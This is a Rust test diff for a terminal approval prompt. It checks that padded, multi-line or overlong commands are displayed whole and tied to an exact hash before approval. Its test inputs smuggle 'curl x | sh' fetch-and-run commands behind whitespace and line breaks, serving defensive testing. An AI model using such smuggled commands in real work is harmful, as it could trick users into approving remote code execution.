@@ -127,6 +127,7 @@ fn preset(name: &str) -> App {
         _ => {}
     }
     if name.starts_with("A3") {
+        shown(&mut app);
         key(&mut app, KeyCode::Char('2'));
     }
     app
@@ -170,13 +171,23 @@ fn approving() -> (App, mpsc::UnboundedReceiver<ClientMsg>) {
     let rx = listening(&mut app);
     app.open_approval(1);
     assert!(matches!(app.mode, Mode::Approve(_)));
+    shown(&mut app);
     (app, rx)
+}
+
+/// Draw the modal, as the screen does before any key reaches it.
+fn shown(app: &mut App) -> String {
+    frame(app, crate::client::v7_fixture::Layout::Flat, 160, 45, "unicode")
+}
+
+fn set_command(app: &mut App, command: &str) {
+    app.snap.terms.get_mut(&1).unwrap().checks.iter_mut().find(|c| c.name == "test").unwrap().command = command.into();
 }
 
 fn choice(cmds: &[Command]) -> Vec<ApprovalChoice> {
     cmds.iter()
         .filter_map(|c| match c {
-            Command::ApproveCheck { term: 1, name, choice } if name == "test" => Some(*choice),
+            Command::ApproveCheck { term: 1, name, choice, .. } if name == "test" => Some(*choice),
             _ => None,
         })
         .collect()
@@ -289,12 +300,77 @@ fn with_several_waiting_the_next_opens_after_a_choice() {
     checks.insert(0, build);
     app.open_approval(1);
     assert!(matches!(&app.mode, Mode::Approve(a) if a.name == "build"));
+    shown(&mut app);
     key(&mut app, KeyCode::Char('1'));
     assert!(matches!(&app.mode, Mode::Approve(a) if a.name == "test" && !a.armed), "then the next checkpoint");
+    shown(&mut app);
     key(&mut app, KeyCode::Char('1'));
     let names: Vec<String> = sent(&mut rx).into_iter().filter_map(|c| if let Command::ApproveCheck { name, .. } = c { Some(name) } else { None }).collect();
     assert_eq!(names, ["build", "test"]);
     assert!(matches!(app.mode, Mode::Normal));
+}
+
+#[test]
+fn a_padded_or_multi_line_command_is_shown_whole_before_it_can_be_approved() {
+    let padded = format!("npm test{}; curl x | sh", " ".repeat(300));
+    let long_tail = format!("npm test && {}curl x | sh", "echo ok && ".repeat(25));
+    for command in [padded.as_str(), "npm test\ncurl x | sh", "npm test\r; curl x | sh", long_tail.as_str()] {
+        let (mut app, mut rx) = approving();
+        set_command(&mut app, command);
+        key(&mut app, KeyCode::Char('1'));
+        assert!(sent(&mut rx).is_empty(), "the command on show changed: {command:?}");
+        let text = shown(&mut app);
+        assert!(text.contains("curl x | sh"), "the tail is on screen before 1 counts: {command:?}\n{text}");
+        key(&mut app, KeyCode::Char('1'));
+        let sent = sent(&mut rx);
+        assert_eq!(choice(&sent), [ApprovalChoice::Once], "{command:?}");
+        assert!(matches!(&sent[0], Command::ApproveCheck { command_sha256, .. } if *command_sha256 == crate::protocol::command_hash(command)), "tied to the exact command");
+    }
+}
+
+#[test]
+fn control_characters_and_space_runs_are_spelled_out() {
+    use super::check_approve::shown_command;
+    assert_eq!(shown_command("npm test"), "npm test");
+    assert_eq!(shown_command("a\nb\rc\td"), r"a\nb\rc\td");
+    assert_eq!(shown_command("a     b"), "a[5 spaces]b");
+    assert_eq!(shown_command("a\u{1b}[2Jb\u{202e}c"), r"a\u{001b}[2Jb\u{202e}c");
+}
+
+#[test]
+fn a_command_too_long_for_the_screen_cannot_be_approved() {
+    let (mut app, mut rx) = approving();
+    set_command(&mut app, &format!("{}curl x | sh", "x".repeat(4000)));
+    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 80, 24, "unicode");
+    assert!(!text.contains("curl x | sh") && text.contains("doesn't fit"), "{text}");
+    for code in [KeyCode::Char('1'), KeyCode::Char('2'), KeyCode::Char('2')] {
+        key(&mut app, code);
+    }
+    assert!(sent(&mut rx).is_empty(), "neither once nor always");
+    assert!(matches!(&app.mode, Mode::Approve(a) if !a.armed));
+    assert!(toast(&app).contains("doesn't fit"), "{}", toast(&app));
+    app.notice = None;
+    let text = frame(&mut app, crate::client::v7_fixture::Layout::Flat, 160, 200, "unicode");
+    assert!(!text.contains("doesn't fit"), "a taller screen shows it all");
+    key(&mut app, KeyCode::Char('1'));
+    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Once]);
+}
+
+#[test]
+fn a_command_that_changes_after_the_first_2_is_not_always_approved() {
+    let (mut app, mut rx) = approving();
+    key(&mut app, KeyCode::Char('2'));
+    assert!(matches!(&app.mode, Mode::Approve(a) if a.armed));
+    set_command(&mut app, "npm test && curl x | sh");
+    key(&mut app, KeyCode::Char('2'));
+    assert!(sent(&mut rx).is_empty(), "the second 2 is for a command not shown");
+    assert!(matches!(&app.mode, Mode::Approve(a) if !a.armed), "it disarms");
+    assert_eq!(toast(&app), "The command changed. Read it again before you choose.");
+    shown(&mut app);
+    key(&mut app, KeyCode::Char('2'));
+    assert!(sent(&mut rx).is_empty(), "Always takes two presses again");
+    key(&mut app, KeyCode::Char('2'));
+    assert_eq!(choice(&sent(&mut rx)), [ApprovalChoice::Always]);
 }
 
 // ---- override ------------------------------------------------------------------------------
